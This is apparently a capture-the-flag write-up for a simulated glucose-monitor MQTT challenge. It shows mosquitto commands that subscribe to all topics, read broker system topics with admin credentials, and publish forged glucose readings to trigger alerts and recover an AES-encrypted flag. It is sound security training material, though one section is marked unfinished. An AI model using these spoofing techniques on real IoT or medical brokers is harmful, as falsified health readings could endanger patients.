# Solution

## Interacting with the MQTT server

So, we have a MQTT server on SERVER.
We can try and subscribe to channels there. We don't have a list of all channels, so we'll subscribe to all possible channels using `#`.

```
$ mosquitto_sub -v -h SERVER -p 1883 -t '#'
Connection Refused: not authorised.
```

We need to provide credentials. Let's try the credentials of `user`:

```
$ mosquitto_sub -v -h SERVER -p 1883 -t '#' -u user -P expert
ph0wn18/glucose-level 66
...
```

It works! We get a new glucose level every 20 seconds.

## Hacking


### Possible hack attempts

Now what can we do with that?

1. Try to publish to another topic
2. Try to read system topics
3. Try to modify glucose level

#### Publish to another topic

1. Keep subscriber live (`mosquitto_sub -v -h SERVER -p 1883 -t '#' -u user -P expert`)
2. Meanwhile, we try and publish to another channel:

```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/try' -u user -P expert -m 'test'
Client mosqpub/21302-alligator sending CONNECT
Client mosqpub/21302-alligator received CONNACK
Client mosqpub/21302-alligator sending PUBLISH (d0, q0, r0, m1, 'ph0wn18/try', ... (4 bytes))
Client mosqpub/21302-alligator sending DISCONNECT
```

The debug messages are a bit misleading: the message is sent, but we do not see it in our subscriber. This means that *the message was not published* actually.

#### Read system topics

We don't get any response here:

`mosquitto_sub -v -h SERVER -p 1883 -t '$SYS/#' -u user -P expert`

#### Change glucose level

We change glucose level. Same as previously the debug message say 'PUBLISH' but in reality the message is *not* published as we don't see it in our global subscriber.

```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/glucose-level' -u user -P expert -m '100'
Client mosqpub/22470-alligator sending CONNECT
Client mosqpub/22470-alligator received CONNACK
Client mosqpub/22470-alligator sending PUBLISH (d0, q0, r0, m1, 'ph0wn18/glucose-level', ... (3 bytes))
Client mosqpub/22470-alligator sending DISCONNECT
```

#### Same but as admin

TO WRITE: WHERE TO FIND ADMIN CREDENTIALS IN THE APP.

Also, in the subscriber, you should see from time to time the following message:

```
ph0wn18/info connect as admin for more topics
```

So let's try to subscribe and publish as admin:
- id: `admin`
- password: `Sugar1sBaaaaaaad`

Publishing to another channel: unsuccessful

`mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/try' -u admin -P Sugar1sBaaaaaaad -m 'test'`: the message is actually not published.

Subscribing to SYS topics: **success**

```
$ mosquitto_sub -v -h SERVER -p 1883 -t '$SYS/#' -u admin -P Sugar1sBaaaaaaad
$SYS/broker/version mosquitto version 1.4.12
$SYS/broker/timestamp 2017-06-01 13:03:46+0000
$SYS/broker/uptime 2959 seconds
$SYS/broker/clients/total 4
...
```

- We have a Mosquitto server at the other end, version 1.4.12
- We have 4 clients at all
- The server sent 146 messages so far `$SYS/broker/messages/sent 146`
- etc

Nothing that seems really useful.

Changing glucose level: **success**

```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/glucose-level' -u admin -P Sugar1sBaaaaaaad -m '150'`
```
It works and we indeed see the new value printed in our subscriber.

How about trying strange values.

```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/glucose-level' -u admin -P Sugar1sBaaaaaaad -m 'test'
```

And in our subscriber we see a message on a new topic `ph0wn18/alert`:

```
ph0wn18/alert Hmm. Someone's trying to hack me? You're getting close.
```

We try with a high level of glucose.
```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/glucose-level' -u admin -P Sugar1sBaaaaaaad -m '5000'
```

We see in our subscriber:

```
ph0wn18/glucose-level 5000
ph0wn18/alert Too high blood sugar!
```

How about launching a subscriber as `admin`:

```
$ mosquitto_sub -v -h SERVER -p 1883 -t '#' -u admin -P Sugar1sBaaaaaaad
```

We get a little more, because we have a topic `ph0wn18/flag` which is promising:

```
ph0wn18/glucose-level 67
ph0wn18/glucose-level 5000
ph0wn18/flag Nice try. Try and generate another type of alert.
```

We try with a low level of glucose:

```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/glucose-level' -u admin -P Sugar1sBaaaaaaad -m '-10'

ph0wn18/glucose-level -10
ph0wn18/alert Hypoglycemia risk!!
ph0wn18/info Ensure your team id is correctly set in ph0wn18/teamid - or set it (admin required)
ph0wn18/flag Encrypted token: VXNlIGFkbWluIHBhc3N3b3JkIHRvIGRlY3J5cHQgQUVTOiBjRD3ndvozFLDfPnaJ7GpENVuftgJgG6jdwpKdb6Q5lfDNqgJbCKVQ5tdAxvLdHFA=
```

We set our team id:

```
$ mosquitto_pub -d -h SERVER -p 1883 -t 'ph0wn18/teamid' -u admin -P Sugar1sBaaaaaaad -m 'team2'
```


## Decrypting

The flag message talks about an "encrypted" token. We recognize it uses Base64:

```python
token = 'VXNlIGFkbWluIHBhc3N3b3JkIHRvIGRlY3J5cHQgQUVTOiBjRD3ndvozFLDfPnaJ7GpENVuftgJgG6jdwpKdb6Q5lfDNqgJbCKVQ5tdAxvLdHFA='
base64.b64decode(token)
```

and it decrypts to : "Use team password to decrypt AES: cD=\xe7v..."


Each team has its own team key. So we decrypt:

```python
from Crypto.Cipher import AES
cipher = AES.new('YOUR TEAM PASSWORD')
cipher.decrypt('cD=\xe7v\xfa3\x14\xb0\xdf>v\x89\xecjD5[\x9f\xb6\x02`\x1b\xa8\xdd\xc2\x92\x9do\xa49\x95\xf0\xcd\xaa\x02[\x08\xa5P\xe6\xd7@\xc6\xf2\xdd\x1cP')
```

The result is : `ph0wn{ur_lucky_no_diab4te_h4r3} `

## Source code for solution


`sudo -H pip install paho-mqtt`

see `mqtt-solve.py`

```
$ python mqtt-solve.py 
hacker] Topic: ph0wn18/flag Message: Encrypted token (team key): VXNlIHRlYW0gcGFzc3dvcmQgdG8gZGVjcnlwdCBBRVM6IEQFdgjLv3EiEaFJZ/rsIsomxqb51JTjREHDTwMbdDx2wjea79fH0PhvRQA3N2W8uw==
Received encrypted flag
[hacker] VXNlIHRlYW0gcGFzc3dvcmQgdG8gZGVjcnlwdCBBRVM6IEQFdgjLv3EiEaFJZ/rsIsomxqb51JTjREHDTwMbdDx2wjea79fH0PhvRQA3N2W8uw==
The flag is ph0wn{ur_lucky_no_diab4te_h4r3} 
```
